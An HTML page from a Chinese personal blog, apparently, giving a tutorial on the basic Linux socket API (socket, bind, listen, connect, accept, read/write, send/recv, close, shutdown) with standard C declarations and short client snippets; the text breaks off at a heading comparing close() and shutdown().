@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Merlin" />
+
+
+
+<meta name="description" content="basic socket api of linux c.">
+<meta name="keywords" content="linux,网络,socket">
+<meta property="og:type" content="article">
+<meta property="og:title" content="技术: Linux 基础套接字模型">
+<meta property="og:url" content="http://www.merlinblog.site/posts/8967f437/index.html">
+<meta property="og:site_name" content="梅林日志">
+<meta property="og:description" content="basic socket api of linux c.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg">
+<meta property="og:updated_time" content="2018-04-12T06:55:17.629Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="技术: Linux 基础套接字模型">
+<meta name="twitter:description" content="basic socket api of linux c.">
+<meta name="twitter:image" content="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="梅林日志" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.gif">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/red/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>技术: Linux 基础套接字模型 | 梅林日志</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/mine.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Merlin</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">云卷云舒，平常心态</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">[归档]</a></li>
+                        
+                            <li><a href="/works/">小作品</a></li>
+                        
+                            <li><a href="/tags/">[标签]</a></li>
+                        
+                            <li><a href="/about/">关于</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/WizardMerlin" title="GitHub"></a>
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/170414854/" title="豆瓣"></a>
+                            
+                                <a class="fa Email" href="mailto:&#119;&#105;&#122;&#97;&#114;&#100;&#109;&#101;&#114;&#108;&#105;&#110;&#57;&#52;&#53;&#64;&#103;&#109;&#97;&#105;&#108;&#46;&#99;&#111;&#109;" title="Email"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?Menu=yes&uin=3076407405" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">极简.</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Merlin</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/mine.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Merlin</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">云卷云舒，平常心态</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">[归档]</a></li>
+                
+                    <li><a href="/works/">小作品</a></li>
+                
+                    <li><a href="/tags/">[标签]</a></li>
+                
+                    <li><a href="/about/">关于</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/WizardMerlin" title="GitHub"></a>
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/170414854/" title="豆瓣"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:&#119;&#105;&#122;&#97;&#114;&#100;&#109;&#101;&#114;&#108;&#105;&#110;&#57;&#52;&#53;&#64;&#103;&#109;&#97;&#105;&#108;&#46;&#99;&#111;&#109;" title="Email"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?Menu=yes&uin=3076407405" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-basic-socket-model" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/posts/8967f437/" class="article-date">
+      <time datetime="2017-06-11T05:03:36.000Z" itemprop="datePublished">2017-06-11</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      技术: Linux 基础套接字模型
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/技术/">技术</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/socket/">socket</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>basic socket api of linux c.<br><a id="more"></a></p>
+<blockquote>
+<p>现在的很多库基本是基于异步网络IO, 以及 epoll等模型的封装, 但是 epoll模型的基础也还是基本的 socket api .<br>最开始学习网络编程的时候, 这个地方肯定是逃不过去的.</p>
+</blockquote>
+<p>相关代码可以参考: <a href="https://github.com/WizardMerlin/network_life" target="_blank" rel="noopener">https://github.com/WizardMerlin/network_life</a></p>
+<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>网络编程中第一个部分是深入学习TCP/IP模型, 其次就是借助socket api进行实践.<br><img src="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg" alt=""></p>
+<p>大概涉及如下api:</p>
+<ul>
+<li>创建 socket bind listen accept</li>
+<li>收发 read/recv/recvfrom write/send/sendto</li>
+<li>关闭 close shutdown</li>
+<li>参数 getsockopt/setsockopt</li>
+<li>地址 gethostbyaddr getaddrbyhost</li>
+</ul>
+<p>socket是posix系统或者unix系统中一种特殊的文件, 也可以按照文件读写的方式进行读写 (打开, read/write, 关闭)</p>
+<pre><code>一个完整的连接需要一对套接字
+</code></pre><p>基本的网络IO模型说起来也就3句话:</p>
+<ul>
+<li>客户端和服务端建立连接</li>
+<li>开始进行网络IO传输数据</li>
+<li>完毕后断开连接</li>
+</ul>
+<hr>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="连接函数"><a href="#连接函数" class="headerlink" title="连接函数"></a>连接函数</h2><p>服务端: socket, bind, listen, accept;<br>客户端: socket, connect</p>
+<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>你就把这个函数理解成打开文件(它返回一个可操作的文件fd或者称为socket descriptor). 正如可以给fopen的传入不同参数值, 以打开不同的文件. 创建socket的时候,也可以指定不同的参数创建不同的socket描述符.</p>
+<p>参数解释:</p>
+<p><code>domain</code> : 是指协议族, 具体可以查看/usr/include/bits/socket.h的定义, 常见的有:</p>
+<ol>
+<li>AF_INET  </li>
+<li>AF_INET6</li>
+<li>AF_LOCAL(或称AF_UNIX，Unix域socket)</li>
+<li>AF_ROUTE</li>
+</ol>
+<p>协议族决定了通信对应的地址类型:</p>
+<ul>
+<li>AF_INET用ipv4地址(32位的)与端口号(16位的)的组合</li>
+<li>AF_INET6, 即ipv6的地址</li>
+<li>AF_UNIX用一个绝对路径名作为地址(本地套接字)</li>
+</ul>
+<p><code>type</code> : 根据使用协议的不同采用不同的socket类型(流还是数据报)–socket type和 protocol是配合的.<br>主要有SOCK_STREAM, SOCK_DGRAM, SOCK_RAW, SOCK_PACKET, SOCK_SEQPACKET等等</p>
+<ul>
+<li>SOCK_STREAM 表明我们用的是 TCP 协议,这样会提供按顺序的,可靠,双向,面向连接的比特流(可以按字节读取)</li>
+<li>SOCK_DGRAM 表明我们用的是 UDP 协议,这样只会提供定长的,不可靠,无连接的通信(只能按消息读取)</li>
+</ul>
+<p><code>protocol</code> : 指定协议, 常用的协议有: IPPROTO_TCP , IPPTOTO_UDP, IPPROTO_SCTP, IPPROTO_TIPC 等IP层的协议<br>这里其实可以填0, 因为会自动根据type对应的协议(前面一个参数type填写好, 这里直接填写0就可以了)    </p>
+<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>通过socket返回的 “socket fd” 只有协议相关的信息, 但是还没有存储具体的地址和端口, 需要借助bind()函数把具体的地址和端口号赋值给socket fd.</p>
+<p><code>sockfd</code> : 即socket描述字, 它是通过socket()函数创建了, 唯一标识一个socket. bind()函数就是将给这个描述字绑定一个具体地址.</p>
+<p><code>addr</code> : 该结构体常量指针通常指向需要填充的地址协议信息, struct sockaddr根据协议族的不同有不同的机构.<br>可能是历史原因: 现在没有使用 struct sockaddr(而是使用的sockaddr_in), 所以到时候要强转(struct sockaddr*), 例如 </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">(struct sockaddr*)addr;</span><br></pre></td></tr></table></figure>
+<p>如ipv4和ipv6:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ipv4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">  <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">  <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv6</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span> </span><br><span class="line">  <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span> </span><br><span class="line">  <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span> </span><br><span class="line">  <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span class="comment">/* IPv6 address */</span> </span><br><span class="line">  <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span> </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Unix域对应的是:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">  <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span> </span><br><span class="line">  <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>除了本地套接字(Unix)套接字外, 都要制定网络ip address和 network port.<br>(也就是使用的时候, 要从本机序转换到网络序)</p>
+<p>比较常见的填充代码:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"></span><br><span class="line">servaddr.sin_family = domain; </span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY);<span class="comment">//INADDR_ANY表示可以和任何的主机通信</span></span><br><span class="line">servaddr.sin_port = htons(port);</span><br></pre></td></tr></table></figure>
+<p><code>addrlen</code> : 对应地址的长度, 一般就是sockaddr_in的长度</p>
+<p>完整的案例:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (bind(socketfd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr))) == <span class="number">-1</span>)&#123;</span><br><span class="line">   <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通常服务器在启动的时候都会绑定一个众所周知的地址(如ip地址+端口号), 用于提供服务, 客户就可以通过它来接连服务器;<br>而客户端就不用指定, 由系统自动分配一个端口号和自身的ip地址组合.这就是为什么通常服务器端在listen之前会调用bind(), 而客户端就不会调用, 而是在connect()时由系统随机生成一个.</p>
+<p>(主机序: 现在的x86架构一般是小端, 但是不保证, 也不要假定; 传输之前还是做一下转换; 网络序: 大端)<br>(0x0102, 如果a[0]存的是02就表示是小端; 否则是大端)<br>(网络字节序：4个字节的32 bit值以下面的次序传输. 首先是0～7bit, 其次8～15bit, 然后16～23bit, 最后是24~31bit)</p>
+<p>在将一个地址绑定到socket 的时候, 请先将主机字节序转换成为网络字节序, 而不要假定主机字节序跟网络字节序一样使用的是Big-Endian.<br>例如:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">servaddr.sin_port = htons(port);</span><br></pre></td></tr></table></figure>
+<p>再次强调务必转成网络序.</p>
+<h3 id="listen和connect"><a href="#listen和connect" class="headerlink" title="listen和connect"></a>listen和connect</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>; ---服务端(第二个参数为相应socket可以排队的最大连接个数)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;  ---客户端(第二个参数为服务器端socket fd, 第三个参数是该fd的长度)</span><br></pre></td></tr></table></figure>
+<p>如果连接数目达此上限则 client 端将收到ECONNREFUSED 的错误;<br>listen()只适用 SOCK_STREAM 或 SOCK_SEQPACKET 的socket 类型, 并且如果 socket 为 AF_INET 则参数 backlog 最大值可设至 128 .</p>
+<p>客户端通过该函数发送建立连接请求给服务端<br>例如:<br>(connect并不会返回新的socket fd, 连接成功之后就开始进行读写操作了)<br>( 记得最后buffer[nbytes]=’\0’; 读写操作自己控制socket fd的关闭)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 客户程序发起连接请求 */</span></span><br><span class="line"><span class="keyword">if</span>(connect(sockfd,(struct sockaddr *)(&amp;server_addr),<span class="keyword">sizeof</span>(struct sockaddr))==<span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Connect Error:%s\a\n"</span>,strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* 连接成功了 */</span></span><br><span class="line"><span class="keyword">if</span>((nbytes=read(sockfd,buffer,<span class="number">1024</span>))==<span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Read Error:%s\n"</span>,strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">buffer[nbytes]=<span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I have received:%s\n"</span>, buffer);</span><br><span class="line"><span class="comment">/* 结束通讯 */</span></span><br><span class="line">close(sockfd);</span><br></pre></td></tr></table></figure>
+<p>但是注意在阻塞IO下 <code>read</code> 如果读不满1024会阻塞等待知道满足或者超时.</p>
+<h3 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>; <span class="comment">//第一个参数为服务器端socket fd</span></span><br></pre></td></tr></table></figure>
+<p>一旦服务端接受该请求(tcp请求队列中拿出一个), 就返回一个新的用于读写的fd(由内核生成); 此时连接也建立完毕了, 可以进行IO了(网络IO和本地IO并没有太多的区别)</p>
+<p>参数:</p>
+<ul>
+<li><code>sockfd</code> : 监听套接字, 就是socket函数产生的(服务器的一次生命周期中仅创建一个;而 accept 函数返回的是已连接的 socket 描述字, 完成客户的请求该套接字就被关闭).</li>
+<li><code>addr</code> : 这是一个传出参数, struct sockaddr *的指针, 用于返回客户端的协议地址 (不区分客户端直接传入NULL, 记得强转)</li>
+<li><code>addrlen</code> : 客户端struct sockaddr 协议地址的长度; (放的是指针, 说明是传出参数)</li>
+</ul>
+<p>accept之后, 就可以进行网络IO了(关于网络IO, 也还有好几种专门的网络IO模型)</p>
+<h2 id="IO函数"><a href="#IO函数" class="headerlink" title="IO函数"></a>IO函数</h2><h3 id="基本IO函数"><a href="#基本IO函数" class="headerlink" title="基本IO函数"></a>基本IO函数</h3><p>read()/write()</p>
+<p>简单的使用Linux的文件api进行网络IO:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure>
+<p>介绍一下read, write:<br>      read函数是负责从 fd中读取内容.<br>    当读成功时, read返回实际所读的字节数(&gt;0), 如果返回的值是0表示已经读到文件的结束, 小于0表示出现了错误.<br>    如果错误为 EINTR 说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p>
+<pre><code>  write函数将buf中的nbytes字节内容写入文件描述符fd.成功时返回写的字节数(&gt;0).失败时返回-1, 并设置 errno变量.
+在网络程序中, 当我们向套接字文件描述符写时有俩种可能:
+1. 返回值大于0; 表示写了部分或者是全部的数据
+2. 返回值小于0; 此时出现了错误.
+错误为EINTR 表示在写的时候出现了中断错误
+如果为EPIPE表示网络连接出现了问题(对方已经关闭了连接)
+</code></pre><h3 id="专于socket"><a href="#专于socket" class="headerlink" title="专于socket"></a>专于socket</h3><pre><code>recv()/send()----和read, write大致一样, 不过flags提供了更加强大的选项
+recvfrom()/sendto() ---- 一般用在udp中(server bind之后之后不需要listen, 直接和客户端进行通信)---容易阻塞
+recvmsg()/sendmsg() ---- 最通用的, 最强大的,可以实现前面所有函数的功能.(涉及到的struct msghdr, iovec比较复杂)
+</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">			  </span><br><span class="line"><span class="keyword">ssize_t</span> send(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">ssize_t</span> recv(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> sendto(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">	       <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen);</span><br><span class="line"><span class="keyword">ssize_t</span> recvfrom(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">		 struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> sendmsg(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">ssize_t</span> recvmsg(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *msg_name;</span><br><span class="line">  <span class="keyword">int</span> msg_namelen;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span></span><br><span class="line">  <span class="keyword">int</span> msg_iovlen;</span><br><span class="line">  <span class="keyword">void</span> *msg_control;</span><br><span class="line">  <span class="keyword">int</span> msg_controllen;</span><br><span class="line">  <span class="keyword">int</span> msg_flags;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *iov_base; <span class="comment">/* 缓冲区开始的地址 */</span></span><br><span class="line">  <span class="keyword">size_t</span> iov_len; <span class="comment">/* 缓冲区的长度 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="关闭IO"><a href="#关闭IO" class="headerlink" title="关闭IO"></a>关闭IO</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>close 操作只是使相应socket描述字的引用计数-1, 只有当引用计数为0的时候, 才会触发TCP客户端向服务器发送终止连接请求.<br>(被关闭的套接字不能在用于read或者write了; 注意你关闭了是accept出来用于响应客户端读写请求的socket fd还是listen fd)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> howto)</span></span></span><br></pre></td></tr></table></figure>
+<p>TCP 连接是双向的(是可读写的),当我们使用 close 时,会把读写通道都关闭,有时侯我们希望只关闭一个方向,这个时候我们可以使用 shutdown.<br>针对不同的 howto,系统回采取不同的关闭方式.</p>
+<ul>
+<li>howto=0 这个时候系统会关闭读通道. 但是可以继续往接字描述符写.</li>
+<li>howto=1 关闭写通道, 和上面相反,着时候就只可以读了.</li>
+<li>howto=2 关闭读写通道, 和 close 一样 </li>
+</ul>
+<p>close() Vs shutdown()</p>
